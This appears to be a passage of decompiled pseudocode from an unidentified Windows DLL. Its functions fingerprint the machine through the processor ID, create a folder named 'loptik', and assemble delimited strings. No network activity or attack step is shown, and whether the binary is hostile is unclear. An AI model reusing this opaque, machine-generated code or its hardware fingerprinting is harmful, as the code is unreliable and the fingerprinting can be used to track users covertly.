    "",
    "  v42 = a1;",
    "  v44 = a1;",
    "  _EAX = 1;",
    "  v48 = 0;",
    "  __asm { cpuid }",
    "  *(_DWORD *)&ArgList[8] = _EAX;",
    "  *(_DWORD *)&ArgList[12] = _EBX;",
    "  v46 = __PAIR64__(_EDX, _ECX);",
    "  v6 = 3;",
    "  *(_OWORD *)v35 = 0;",
    "  v36 = 0;",
    "  v37 = 15;",
    "  LOBYTE(v35[0]) = 0;",
    "  v43 = 2;",
    "  v41 = 3;",
    "  do",
    "  {",
    "    if ( v6 != 2 && v6 != 1 )",
    "    {",
    "      sub_10003550(Src, 9u, \"%08X\", *(_DWORD *)&ArgList[4 * v6 + 8]);",
    "      Src[8] = 0;",
    "      v7 = strlen(Src);",
    "      v8 = v36;",
    "      if ( v7 > v37 - v36 )",
    "      {",
    "        LOBYTE(v44) = 0;",
    "        sub_1000A260(v35, v7, v44, (int)Src, v7);",
    "      }",
    "      else",
    "      {",
    "        v36 += v7;",
    "        v9 = v35;",
    "        if ( v37 > 0xF )",
    "          v9 = (void **)v35[0];",
    "        v10 = (char *)v9 + v8;",
    "        memmove(v10, Src, v7);",
    "        v10[v7] = 0;",
    "        v6 = v41;",
    "      }",
    "    }",
    "    v41 = --v6;",
    "  }",
    "  while ( v6 >= 0 );",
    "  v11 = sub_10003590(v31);",
    "  LOBYTE(v48) = 1;",
    "  v12 = sub_10003A60(v33);",
    "  LOBYTE(v48) = 2;",
    "  v13 = v12[5];",
    "  v14 = v12[4];",
    "  if ( v13 == v14 )",
    "  {",
    "    LOBYTE(v44) = 0;",
    "    v12 = (_DWORD *)sub_1000A260(v12, 1, v44, (int)\"-\", 1u);",
    "  }",
    "  else",
    "  {",
    "    v12[4] = v14 + 1;",
    "    v15 = v12;",
    "    if ( v13 > 0xF )",
    "      v15 = (_DWORD *)*v12;",
    "    *(_WORD *)((char *)v15 + v14) = 45;",
    "  }",
    "  v16 = *(_OWORD *)v12;",
    "  v43 = 6;",
    "  *(_OWORD *)v29 = v16;",
    "  v30 = *((_QWORD *)v12 + 2);",
    "  v12[4] = 0;",
    "  v12[5] = 15;",
    "  *(_BYTE *)v12 = 0;",
    "  LOBYTE(v48) = 3;",
    "  sub_1000A4E0(v42, v29, v11);",
    "  v43 = 14;",
    "  LOBYTE(v48) = 4;",
    "  v17 = v39;",
    "  if ( v40 == v39 )",
    "  {",
    "    LOBYTE(v44) = 0;",
    "    v19 = (void **)sub_1000A260(Block, 1, v44, (int)\"-\", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v39;",
    "    v18 = Block;",
    "    if ( v40 > 0xF )",
    "      v18 = (void **)Block[0];",
    "    *(_WORD *)((char *)v18 + v17) = 45;",
    "    v19 = Block;",
    "  }",
    "  v20 = *(_OWORD *)v19;",
    "  v43 = 30;",
    "  *(_OWORD *)ArgList = v20;",
    "  v46 = *((_QWORD *)v19 + 2);",
    "  v19[4] = 0;",
    "  v19[5] = (void *)15;",
    "  *(_BYTE *)v19 = 0;",
    "  v21 = v42;",
    "  LOBYTE(v48) = 5;",
    "  sub_1000A4E0(v42, ArgList, v35);",
    "  if ( HIDWORD(v46) > 0xF )",
    "  {",
    "    v22 = *(void **)ArgList;",
    "    if ( (unsigned int)(HIDWORD(v46) + 1) >= 0x1000 )",
    "    {",
    "      v22 = *(void **)(*(_DWORD *)ArgList - 4);",
    "      if ( (unsigned int)(*(_DWORD *)ArgList - (_DWORD)v22 - 4) > 0x1F )",
    "        goto LABEL_45;",
    "    }",
    "    sub_100154EB(v22);",
    "  }",
    "  if ( v40 > 0xF )",
    "  {",
    "    v23 = Block[0];",
    "    if ( v40 + 1 >= 0x1000 )",
    "    {",
    "      v23 = (void *)*((_DWORD *)Block[0] - 1);",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v23 - 4) > 0x1F )",
    "        goto LABEL_45;",
    "    }",
    "    sub_100154EB(v23);",
    "  }",
    "  v39 = 0;",
    "  v40 = 15;",
    "  LOBYTE(Block[0]) = 0;",
    "  if ( HIDWORD(v30) > 0xF )",
    "  {",
    "    v24 = v29[0];",
    "    if ( (unsigned int)(HIDWORD(v30) + 1) >= 0x1000 )",
    "    {",
    "      v24 = (void *)*((_DWORD *)v29[0] - 1);",
    "      if ( (unsigned int)((char *)v29[0] - (char *)v24 - 4) > 0x1F )",
    "        goto LABEL_45;",
    "    }",
    "    sub_100154EB(v24);",
    "  }",
    "  if ( v34 > 0xF )",
    "  {",
    "    v25 = v33[0];",
    "    if ( v34 + 1 >= 0x1000 )",
    "    {",
    "      v25 = (void *)*((_DWORD *)v33[0] - 1);",
    "      if ( (unsigned int)((char *)v33[0] - (char *)v25 - 4) > 0x1F )",
    "        goto LABEL_45;",
    "    }",
    "    sub_100154EB(v25);",
    "  }",
    "  v33[4] = 0;",
    "  v34 = 15;",
    "  LOBYTE(v33[0]) = 0;",
    "  if ( v32 > 0xF )",
    "  {",
    "    v26 = v31[0];",
    "    if ( v32 + 1 >= 0x1000 )",
    "    {",
    "      v26 = (void *)*((_DWORD *)v31[0] - 1);",
    "      if ( (unsigned int)((char *)v31[0] - (char *)v26 - 4) > 0x1F )",
    "        goto LABEL_45;",
    "    }",
    "    sub_100154EB(v26);",
    "  }",
    "  v31[4] = 0;",
    "  v32 = 15;",
    "  LOBYTE(v31[0]) = 0;",
    "  if ( v37 > 0xF )",
    "  {",
    "    v27 = v35[0];",
    "    if ( v37 + 1 < 0x1000",
    "      || (v27 = (void *)*((_DWORD *)v35[0] - 1), (unsigned int)((char *)v35[0] - (char *)v27 - 4) <= 0x1F) )",
    "    {",
    "      sub_100154EB(v27);",
    "      return v21;",
    "    }",
    "LABEL_45:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  return v21;",
    "}",
    "",
    "",
    "_DWORD *__stdcall sub_10008500(_DWORD *Src)",
    "{",
    "  int v1; // ebx",
    "  void *v2; // esi",
    "  void **v3; // eax",
    "  void *v4; // edx",
    "  size_t v5; // ecx",
    "  void *v6; // edx",
    "  size_t v7; // ecx",
    "  _DWORD *result; // eax",
    "  _BYTE *v9; // edx",
    "  size_t v10; // ecx",
    "  void *v11; // edx",
    "  size_t v12; // ecx",
    "  void *v13; // edx",
    "  size_t v14; // ecx",
    "  _BYTE *v15; // edx",
    "  size_t v16; // ecx",
    "  void *v17; // edx",
    "  size_t v18; // ecx",
    "  void *v19; // edx",
    "  size_t v20; // ecx",
    "  void *v21; // [esp-48h] [ebp-F4h]",
    "  void *v22; // [esp-48h] [ebp-F4h]",
    "  int v23; // [esp-44h] [ebp-F0h]",
    "  int v24; // [esp-44h] [ebp-F0h]",
    "  int v25; // [esp-40h] [ebp-ECh]",
    "  int v26; // [esp-40h] [ebp-ECh]",
    "  int v27; // [esp-3Ch] [ebp-E8h]",
    "  int v28; // [esp-3Ch] [ebp-E8h]",
    "  int v29; // [esp-38h] [ebp-E4h]",
    "  int v30; // [esp-38h] [ebp-E4h]",
    "  int v31; // [esp-34h] [ebp-E0h]",
    "  int v32; // [esp-34h] [ebp-E0h]",
    "  void *v33; // [esp-30h] [ebp-DCh] BYREF",
    "  int v34; // [esp-2Ch] [ebp-D8h]",
    "  int v35; // [esp-28h] [ebp-D4h]",
    "  int v36; // [esp-24h] [ebp-D0h]",
    "  int v37; // [esp-20h] [ebp-CCh]",
    "  int v38; // [esp-1Ch] [ebp-C8h]",
    "  void *v39; // [esp-18h] [ebp-C4h] BYREF",
    "  int v40; // [esp-14h] [ebp-C0h]",
    "  int v41; // [esp-10h] [ebp-BCh]",
    "  int v42; // [esp-Ch] [ebp-B8h]",
    "  size_t v43; // [esp-8h] [ebp-B4h]",
    "  size_t v44; // [esp-4h] [ebp-B0h]",
    "  int v45; // [esp+0h] [ebp-ACh]",
    "  int v46; // [esp+4h] [ebp-A8h]",
    "  void *Block[5]; // [esp+10h] [ebp-9Ch] BYREF",
    "  unsigned int v48; // [esp+24h] [ebp-88h]",
    "  void *v49[5]; // [esp+28h] [ebp-84h] BYREF",
    "  unsigned int v50; // [esp+3Ch] [ebp-70h]",
    "  _DWORD *v51; // [esp+40h] [ebp-6Ch]",
    "  _DWORD *v52; // [esp+44h] [ebp-68h]",
    "  void **v53; // [esp+48h] [ebp-64h]",
    "  int v54; // [esp+4Ch] [ebp-60h]",
    "  void *v55; // [esp+50h] [ebp-5Ch]",
    "  void *v56[5]; // [esp+54h] [ebp-58h] BYREF",
    "  unsigned int v57; // [esp+68h] [ebp-44h]",
    "  void *v58; // [esp+6Ch] [ebp-40h] BYREF",
    "  unsigned int v59; // [esp+80h] [ebp-2Ch]",
    "  void *v60[4]; // [esp+84h] [ebp-28h] BYREF",
    "  size_t Size; // [esp+94h] [ebp-18h]",
    "  unsigned int v62; // [esp+98h] [ebp-14h]",
    "  int v63; // [esp+A8h] [ebp-4h]",
    "",
    "  v51 = Src;",
    "  v52 = Src;",
    "  sub_1000A970(v45, v46);",
    "  sub_10008110((int)Src);",
    "  v63 = 0;",
    "  v54 = 1;",
    "  sub_100031E0();",
    "  sub_10003290(v56, Src, v43, v44);",
    "  v63 = 1;",
    "  v1 = sub_10002FE0();",
    "  v53 = &v33;",
    "  sub_10009E70(v1);",
    "  sub_1000B000(&v33, v21, v23, v25, v27, v29, v31);",
    "  LOBYTE(v63) = 2;",
    "  sub_10009E70(v1 + 1248);",
    "  LOBYTE(v63) = 1;",
    "  sub_1000B970((int)&v39, v22, v24, v26, v28, v30, v32, v33, v34, v35, v36, v37, v38);",
    "  sub_1000BA90((int)v60, v39, v40, v41, v42, v43, v44);",
    "  LOBYTE(v63) = 3;",
    "  sub_10009E70(v1 + 1272);",
    "  v2 = (void *)sub_1000B000(v49, v39, v40, v41, v42, v43, v44);",
    "  LOBYTE(v63) = 4;",
    "  if ( Size == 0x7FFFFFFF )",
    "    sub_10001540();",
    "  v3 = v60;",
    "  v44 = 1;",
    "  if ( v62 > 0xF )",
    "    v3 = (void **)v60[0];",
    "  sub_1000A6C0(Block, (int)v55, Size, (int)v3, Size, (int)\"\\\\\", v44);",
    "  v54 = 3;",
    "  LOBYTE(v63) = 5;",
    "  sub_1000A4E0((int)v55, Block, v2);",
    "  v54 = 7;",
    "  LOBYTE(v63) = 7;",
    "  if ( v48 > 0xF )",
    "  {",
    "    v4 = Block[0];",
    "    v5 = v48 + 1;",
    "    if ( v48 + 1 >= 0x1000 )",
    "    {",
    "      v4 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v5 = v48 + 36;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v4 - 4) > 0x1F )",
    "        goto LABEL_40;",
    "    }",
    "    v44 = v5;",
    "    sub_100154EB(v4);",
    "  }",
    "  LOBYTE(v63) = 8;",
    "  if ( v50 <= 0xF )",
    "    goto LABEL_12;",
    "  v6 = v49[0];",
    "  v7 = v50 + 1;",
    "  if ( v50 + 1 >= 0x1000 )",
    "  {",
    "    v6 = (void *)*((_DWORD *)v49[0] - 1);",
    "    v7 = v50 + 36;",
    "    if ( (unsigned int)((char *)v49[0] - (char *)v6 - 4) > 0x1F )",
    "LABEL_40:",
    "      _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v44 = v7;",
    "  sub_100154EB(v6);",
    "LABEL_12:",
    "  v49[4] = 0;",
    "  v55 = &v39;",
    "  v50 = 15;",
    "  LOBYTE(v49[0]) = 0;",
    "  sub_10009E70(v56);",
    "  LOBYTE(v63) = 9;",
    "  sub_10009E70(&v58);",
    "  LOBYTE(v63) = 8;",
    "  result = (_DWORD *)sub_1000C310(v33, v34, v35, v36, v37, v38, v39, v40, v41, v42, v43, v44);",
    "  if ( (_BYTE)result == 1 )",
    "  {",
    "    if ( v59 > 0xF )",
    "    {",
    "      v9 = v58;",
    "      v10 = v59 + 1;",
    "      if ( v59 + 1 >= 0x1000 )",
    "      {",
    "        v9 = (_BYTE *)*((_DWORD *)v58 - 1);",
    "        v10 = v59 + 36;",
    "        if ( (unsigned int)((_BYTE *)v58 - v9 - 4) > 0x1F )",
    "          goto LABEL_41;",
    "      }",
    "      v44 = v10;",
    "      sub_100154EB(v9);",
    "    }",
    "    if ( v62 > 0xF )",
    "    {",
    "      v11 = v60[0];",
    "      v12 = v62 + 1;",
    "      if ( v62 + 1 >= 0x1000 )",
    "      {",
    "        v11 = (void *)*((_DWORD *)v60[0] - 1);",
    "        v12 = v62 + 36;",
    "        if ( (unsigned int)((char *)v60[0] - (char *)v11 - 4) > 0x1F )",
    "          goto LABEL_41;",
    "      }",
    "      v44 = v12;",
    "      sub_100154EB(v11);",
    "    }",
    "    Size = 0;",
    "    v62 = 15;",
    "    LOBYTE(v60[0]) = 0;",
    "    if ( v57 <= 0xF )",
    "      return v52;",
    "    v13 = v56[0];",
    "    v14 = v57 + 1;",
    "    if ( v57 + 1 < 0x1000",
    "      || (v13 = (void *)*((_DWORD *)v56[0] - 1), v14 = v57 + 36,",
    "                                                 (unsigned int)((char *)v56[0] - (char *)v13 - 4) <= 0x1F) )",
    "    {",
    "      v44 = v14;",
    "      sub_100154EB(v13);",
    "      return v52;",
    "    }",
    "LABEL_41:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  if ( v59 > 0xF )",
    "  {",
    "    v15 = v58;",
    "    v16 = v59 + 1;",
    "    if ( v59 + 1 >= 0x1000 )",
    "    {",
    "      v15 = (_BYTE *)*((_DWORD *)v58 - 1);",
    "      v16 = v59 + 36;",
    "      if ( (unsigned int)((_BYTE *)v58 - v15 - 4) > 0x1F )",
    "        goto LABEL_41;",
    "    }",
    "    v44 = v16;",
    "    result = (_DWORD *)sub_100154EB(v15);",
    "  }",
    "  if ( v62 > 0xF )",
    "  {",
    "    v17 = v60[0];",
    "    v18 = v62 + 1;",
    "    if ( v62 + 1 >= 0x1000 )",
    "    {",
    "      v17 = (void *)*((_DWORD *)v60[0] - 1);",
    "      v18 = v62 + 36;",
    "      if ( (unsigned int)((char *)v60[0] - (char *)v17 - 4) > 0x1F )",
    "        goto LABEL_41;",
    "    }",
    "    v44 = v18;",
    "    result = (_DWORD *)sub_100154EB(v17);",
    "  }",
    "  Size = 0;",
    "  v62 = 15;",
    "  LOBYTE(v60[0]) = 0;",
    "  if ( v57 > 0xF )",
    "  {",
    "    v19 = v56[0];",
    "    v20 = v57 + 1;",
    "    if ( v57 + 1 >= 0x1000 )",
    "    {",
    "      v19 = (void *)*((_DWORD *)v56[0] - 1);",
    "      v20 = v57 + 36;",
    "      if ( (unsigned int)((char *)v56[0] - (char *)v19 - 4) > 0x1F )",
    "        goto LABEL_41;",
    "    }",
    "    v44 = v20;",
    "    return (_DWORD *)sub_100154EB(v19);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "_DWORD *__stdcall sub_10008890(_DWORD *Src)",
    "{",
    "  _DWORD *v1; // esi",
    "  _DWORD *v2; // edi",
    "  unsigned int v3; // edx",
    "  int v4; // ecx",
    "  _DWORD *v5; // eax",
    "  char *v6; // esi",
    "  __int128 v7; // xmm0",
    "  void *v8; // edx",
    "  size_t v9; // ecx",
    "  const char *v10; // eax",
    "  void *v11; // edi",
    "  char **v12; // eax",
    "  void *v13; // edx",
    "  size_t v14; // ecx",
    "  void *v15; // edx",
    "  size_t v16; // ecx",
    "  _DWORD *result; // eax",
    "  void *v18; // edx",
    "  size_t v19; // ecx",
    "  char *v20; // edx",
    "  size_t v21; // ecx",
    "  void *v22; // edx",
    "  size_t v23; // ecx",
    "  void *v24; // edx",
    "  size_t v25; // ecx",
    "  char *v26; // edx",
    "  size_t v27; // ecx",
    "  void *v28; // edx",
    "  size_t v29; // ecx",
    "  void *v30; // [esp-30h] [ebp-D4h]",
    "  int v31; // [esp-2Ch] [ebp-D0h]",
    "  int v32; // [esp-28h] [ebp-CCh]",
    "  int v33; // [esp-24h] [ebp-C8h]",
    "  int v34; // [esp-20h] [ebp-C4h]",
    "  int v35; // [esp-1Ch] [ebp-C0h]",
    "  void *v36; // [esp-18h] [ebp-BCh] BYREF",
    "  int v37; // [esp-14h] [ebp-B8h]",
    "  int v38; // [esp-10h] [ebp-B4h]",
    "  int v39; // [esp-Ch] [ebp-B0h]",
    "  int v40; // [esp-8h] [ebp-ACh]",
    "  size_t v41; // [esp-4h] [ebp-A8h]",
    "  int v42; // [esp+0h] [ebp-A4h]",
    "  int v43; // [esp+4h] [ebp-A0h]",
    "  void *v44[5]; // [esp+Ch] [ebp-98h] BYREF",
    "  unsigned int v45; // [esp+20h] [ebp-84h]",
    "  void *v46[5]; // [esp+24h] [ebp-80h] BYREF",
    "  unsigned int v47; // [esp+38h] [ebp-6Ch]",
    "  void *v48; // [esp+3Ch] [ebp-68h]",
    "  void **v49; // [esp+40h] [ebp-64h]",
    "  int v50; // [esp+44h] [ebp-60h]",
    "  int v51; // [esp+48h] [ebp-5Ch]",
    "  void *v52[5]; // [esp+4Ch] [ebp-58h] BYREF",
    "  unsigned int v53; // [esp+60h] [ebp-44h]",
    "  void *Block[5]; // [esp+64h] [ebp-40h] BYREF",
    "  unsigned int v55; // [esp+78h] [ebp-2Ch]",
    "  char *Path[4]; // [esp+7Ch] [ebp-28h] BYREF",
    "  size_t Size[2]; // [esp+8Ch] [ebp-18h]",
    "  int v58; // [esp+A0h] [ebp-4h]",
    "",
    "  v1 = Src;",
    "  v48 = Src;",
    "  v51 = (int)Src;",
    "  sub_1000A970(v42, v43);",
    "  sub_10008110((int)Src);",
    "  v58 = 0;",
    "  v50 = 1;",
    "  sub_100031E0();",
    "  sub_10003290(v52, Src, v40, v41);",
    "  v58 = 1;",
    "  v49 = (void **)sub_10002FE0();",
    "  v2 = (_DWORD *)sub_100113C0(Block);",
    "  LOBYTE(v58) = 2;",
    "  v3 = v2[5];",
    "  v4 = v2[4];",
    "  if ( v3 - v4 < 7 )",
    "  {",
    "    LOBYTE(v51) = 0;",
    "    v2 = (_DWORD *)sub_1000A260(v2, 7, v51, (int)\"\\\\loptik\", 7u);",
    "  }",
    "  else",
    "  {",
    "    v2[4] = v4 + 7;",
    "    v5 = v2;",
    "    if ( v3 > 0xF )",
    "      v5 = (_DWORD *)*v2;",
    "    v6 = (char *)v5 + v4;",
    "    memmove((char *)v5 + v4, \"\\\\loptik\", 7u);",
    "    v6[7] = 0;",
    "    v1 = (_DWORD *)v51;",
    "  }",
    "  Size[0] = 0;",
    "  *(_OWORD *)Path = 0;",
    "  Size[1] = 0;",
    "  v7 = *(_OWORD *)v2;",
    "  v50 = 3;",
    "  *(_OWORD *)Path = v7;",
    "  *(_QWORD *)Size = *((_QWORD *)v2 + 2);",
    "  v2[4] = 0;",
    "  v2[5] = 15;",
    "  *(_BYTE *)v2 = 0;",
    "  LOBYTE(v58) = 4;",
    "  if ( v55 > 0xF )",
    "  {",
    "    v8 = Block[0];",
    "    v9 = v55 + 1;",
    "    if ( v55 + 1 >= 0x1000 )",
    "    {",
    "      v8 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v9 = v55 + 36;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v8 - 4) > 0x1F )",
    "        _invalid_parameter_noinfo_noreturn();",
    "    }",
    "    v41 = v9;",
    "    sub_100154EB(v8);",
    "  }",
    "  v10 = (const char *)Path;",
    "  Block[4] = 0;",
    "  if ( Size[1] > 0xF )",
    "    v10 = Path[0];",
    "  v55 = 15;",
    "  LOBYTE(Block[0]) = 0;",
    "  _mkdir(v10);",
    "  sub_10009E70(v49 + 318);",
    "  v11 = (void *)sub_1000B000(v46, v36, v37, v38, v39, v40, v41);",
    "  LOBYTE(v58) = 5;",
    "  if ( Size[0] == 0x7FFFFFFF )",
    "    sub_10001540();",
    "  v12 = Path;",
    "  v41 = 1;",
    "  if ( Size[1] > 0xF )",
    "    v12 = (char **)Path[0];",
    "  sub_1000A6C0(v44, (int)v48, Size[0], (int)v12, Size[0], (int)\"\\\\\", v41);",
    "  v50 = 7;",
    "  LOBYTE(v58) = 6;",
    "  sub_1000A4E0((int)v48, v44, v11);",
    "  v50 = 15;",
    "  LOBYTE(v58) = 8;",
    "  if ( v45 > 0xF )",
    "  {",
    "    v13 = v44[0];",
    "    v14 = v45 + 1;",
    "    if ( v45 + 1 >= 0x1000 )",
    "    {",
    "      v13 = (void *)*((_DWORD *)v44[0] - 1);",
    "      v14 = v45 + 36;",
    "      if ( (unsigned int)((char *)v44[0] - (char *)v13 - 4) > 0x1F )",
    "        goto LABEL_52;",
    "    }",
    "    v41 = v14;",
    "    sub_100154EB(v13);",
    "  }",
    "  LOBYTE(v58) = 9;",
    "  if ( v47 <= 0xF )",
    "    goto LABEL_23;",
    "  v15 = v46[0];",
    "  v16 = v47 + 1;",
    "  if ( v47 + 1 >= 0x1000 )",
    "  {",
    "    v15 = (void *)*((_DWORD *)v46[0] - 1);",
    "    v16 = v47 + 36;",
    "    if ( (unsigned int)((char *)v46[0] - (char *)v15 - 4) > 0x1F )",
    "LABEL_52:",
    "      _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v41 = v16;",
    "  sub_100154EB(v15);",
    "LABEL_23:",
    "  v46[4] = 0;",
    "  v49 = &v36;",
    "  v47 = 15;",
    "  LOBYTE(v46[0]) = 0;",
    "  sub_10009E70(v52);",
    "  LOBYTE(v58) = 10;",
    "  sub_10009E70(Block);",
    "  LOBYTE(v58) = 9;",
    "  result = (_DWORD *)sub_1000C310(v30, v31, v32, v33, v34, v35, v36, v37, v38, v39, v40, v41);",
    "  if ( (_BYTE)result == 1 )",
    "  {",
    "    if ( v55 > 0xF )",
    "    {",
    "      v18 = Block[0];",
    "      v19 = v55 + 1;",
    "      if ( v55 + 1 >= 0x1000 )",
    "      {",
    "        v18 = (void *)*((_DWORD *)Block[0] - 1);",
    "        v19 = v55 + 36;",
    "        if ( (unsigned int)((char *)Block[0] - (char *)v18 - 4) > 0x1F )",
    "          goto LABEL_53;",
    "      }",
    "      v41 = v19;",
    "      sub_100154EB(v18);",
    "    }",
    "    if ( Size[1] > 0xF )",
    "    {",
    "      v20 = Path[0];",
    "      v21 = Size[1] + 1;",
    "      if ( Size[1] + 1 >= 0x1000 )",
    "      {",
    "        v20 = (char *)*((_DWORD *)Path[0] - 1);",
    "        v21 = Size[1] + 36;",
    "        if ( (unsigned int)(Path[0] - v20 - 4) > 0x1F )",
    "          goto LABEL_53;",
    "      }",
    "      v41 = v21;",
    "      sub_100154EB(v20);",
    "    }",
    "    Size[0] = 0;",
    "    Size[1] = 15;",
    "    LOBYTE(Path[0]) = 0;",
    "    if ( v53 <= 0xF )",
    "      return v1;",
    "    v22 = v52[0];",
    "    v23 = v53 + 1;",
    "    if ( v53 + 1 < 0x1000",
    "      || (v22 = (void *)*((_DWORD *)v52[0] - 1), v23 = v53 + 36,",
    "                                                 (unsigned int)((char *)v52[0] - (char *)v22 - 4) <= 0x1F) )",
    "    {",
    "      v41 = v23;",
    "      sub_100154EB(v22);",
    "      return v1;",
    "    }",
    "LABEL_53:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  if ( v55 > 0xF )",
    "  {",
    "    v24 = Block[0];",
    "    v25 = v55 + 1;",
    "    if ( v55 + 1 >= 0x1000 )",
    "    {",
    "      v24 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v25 = v55 + 36;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v24 - 4) > 0x1F )",
    "        goto LABEL_53;",
    "    }",
    "    v41 = v25;",
    "    result = (_DWORD *)sub_100154EB(v24);",
    "  }",
    "  if ( Size[1] > 0xF )",
    "  {",
    "    v26 = Path[0];",
    "    v27 = Size[1] + 1;",
    "    if ( Size[1] + 1 >= 0x1000 )",
    "    {",
    "      v26 = (char *)*((_DWORD *)Path[0] - 1);",
    "      v27 = Size[1] + 36;",
    "      if ( (unsigned int)(Path[0] - v26 - 4) > 0x1F )",
    "        goto LABEL_53;",
    "    }",
    "    v41 = v27;",
    "    result = (_DWORD *)sub_100154EB(v26);",
    "  }",
    "  Size[0] = 0;",
    "  Size[1] = 15;",
    "  LOBYTE(Path[0]) = 0;",
    "  if ( v53 > 0xF )",
    "  {",
    "    v28 = v52[0];",
    "    v29 = v53 + 1;",
    "    if ( v53 + 1 >= 0x1000 )",
    "    {",
    "      v28 = (void *)*((_DWORD *)v52[0] - 1);",
    "      v29 = v53 + 36;",
    "      if ( (unsigned int)((char *)v52[0] - (char *)v28 - 4) > 0x1F )",
    "        goto LABEL_53;",
    "    }",
    "    v41 = v29;",
    "    return (_DWORD *)sub_100154EB(v28);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __stdcall sub_10008CD0(int a1)",
    "{",
    "  int v1; // ebx",
    "  void *v2; // esi",
    "  void **v3; // eax",
    "  void *v4; // edx",
    "  int v5; // ecx",
    "  void *v6; // edx",
    "  int v7; // ecx",
    "  void *v8; // edx",
    "  int v9; // ecx",
    "  void *v10; // edx",
    "  int v11; // ecx",
    "  _BYTE *v12; // edx",
    "  int v13; // ecx",
    "  void *v14; // edx",
    "  int v15; // ecx",
    "  void *v17; // [esp-34h] [ebp-D8h]",
    "  void *v18; // [esp-34h] [ebp-D8h]",
    "  int v19; // [esp-30h] [ebp-D4h]",
    "  int v20; // [esp-30h] [ebp-D4h]",
    "  int v21; // [esp-2Ch] [ebp-D0h]",
    "  int v22; // [esp-2Ch] [ebp-D0h]",
    "  int v23; // [esp-28h] [ebp-CCh]",
    "  int v24; // [esp-28h] [ebp-CCh]",
    "  int v25; // [esp-24h] [ebp-C8h]",
    "  int v26; // [esp-24h] [ebp-C8h]",
    "  int v27; // [esp-20h] [ebp-C4h]",
    "  int v28; // [esp-20h] [ebp-C4h]",
    "  void *v29; // [esp-1Ch] [ebp-C0h] BYREF",
    "  void *v30; // [esp-18h] [ebp-BCh]",
    "  int v31; // [esp-14h] [ebp-B8h]",
    "  int v32; // [esp-10h] [ebp-B4h]",
    "  int v33; // [esp-Ch] [ebp-B0h]",
    "  int v34; // [esp-8h] [ebp-ACh]",
    "  int v35; // [esp-4h] [ebp-A8h]",
    "  int v36; // [esp+0h] [ebp-A4h]",
    "  int v37; // [esp+4h] [ebp-A0h]",
    "  void *v38[5]; // [esp+10h] [ebp-94h] BYREF",
    "  unsigned int v39; // [esp+24h] [ebp-80h]",
    "  void *Block[5]; // [esp+2Ch] [ebp-78h] BYREF",
    "  unsigned int v41; // [esp+40h] [ebp-64h]",
    "  int v42; // [esp+48h] [ebp-5Ch]",
    "  void *Src; // [esp+4Ch] [ebp-58h] BYREF",
    "  unsigned int v44; // [esp+60h] [ebp-44h]",
    "  void *v45[4]; // [esp+64h] [ebp-40h] BYREF",
    "  size_t Size; // [esp+74h] [ebp-30h]",
    "  unsigned int v47; // [esp+78h] [ebp-2Ch]",
    "  void *v48[5]; // [esp+7Ch] [ebp-28h] BYREF",
    "  unsigned int v49; // [esp+90h] [ebp-14h]",
    "  int v50; // [esp+A0h] [ebp-4h]",
    "",
    "  v42 = a1;",
    "  sub_1000A970(v36, v37);",
    "  sub_10008110((int)v45);",
    "  v50 = 0;",
    "  sub_100031E0();",
    "  v1 = sub_10002FE0();",
    "  sub_10009E70(v1 + 1296);",
    "  v2 = (void *)sub_1000B000(v38, v30, v31, v32, v33, v34, v35);",
    "  LOBYTE(v50) = 1;",
    "  if ( 0x7FFFFFFF - Size < 3 )",
    "    sub_10001540();",
    "  v3 = v45;",
    "  v35 = 3;",
    "  if ( v47 > 0xF )",
    "    v3 = (void **)v45[0];",
    "  sub_1000A6C0(Block, v42, Size, (int)v3, Size, (int)\"|||\", v35);",
    "  LOBYTE(v50) = 2;",
    "  sub_1000A4E0(v42, Block, v2);",
    "  LOBYTE(v50) = 4;",
    "  if ( v41 > 0xF )",
    "  {",
    "    v4 = Block[0];",
    "    v5 = v41 + 1;",
    "    if ( v41 + 1 >= 0x1000 )",
    "    {",
    "      v4 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v5 = v41 + 36;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v4 - 4) > 0x1F )",
    "        goto LABEL_30;",
    "    }",
    "    v35 = v5;",
    "    sub_100154EB(v4);",
    "  }",
    "  LOBYTE(v50) = 5;",
    "  if ( v39 <= 0xF )",
    "    goto LABEL_12;",
    "  v6 = v38[0];",
    "  v7 = v39 + 1;",
    "  if ( v39 + 1 >= 0x1000 )",
    "  {",
    "    v6 = (void *)*((_DWORD *)v38[0] - 1);",
    "    v7 = v39 + 36;",
    "    if ( (unsigned int)((char *)v38[0] - (char *)v6 - 4) > 0x1F )",
    "LABEL_30:",
    "      _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v35 = v7;",
    "  sub_100154EB(v6);",
    "LABEL_12:",
    "  v38[4] = 0;",
    "  v39 = 15;",
    "  LOBYTE(v38[0]) = 0;",
    "  sub_10003290(v48, &Src, v34, v35);",
    "  LOBYTE(v50) = 6;",
    "  v35 = (int)v48;",
    "  v42 = (int)&v29;",
    "  sub_10009E70(v1 + 48);",
    "  sub_1000B000(&v29, v17, v19, v21, v23, v25, v27);",
    "  LOBYTE(v50) = 7;",
    "  sub_10009E70(v1 + 1320);",
    "  LOBYTE(v50) = 6;",
    "  sub_1000B970((int)Block, v18, v20, v22, v24, v26, v28, v29, (int)v30, v31, v32, v33, v34);",
    "  LOBYTE(v50) = 8;",
    "  sub_10009FC0((void *)v35);",
    "  if ( v41 > 0xF )",
    "  {",
    "    v8 = Block[0];",
    "    v9 = v41 + 1;",
    "    if ( v41 + 1 >= 0x1000 )",
    "    {",
    "      v8 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v9 = v41 + 36;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v8 - 4) > 0x1F )",
    "        _invalid_parameter_noinfo_noreturn();",
    "    }",
    "    v35 = v9;",
    "    sub_100154EB(v8);",
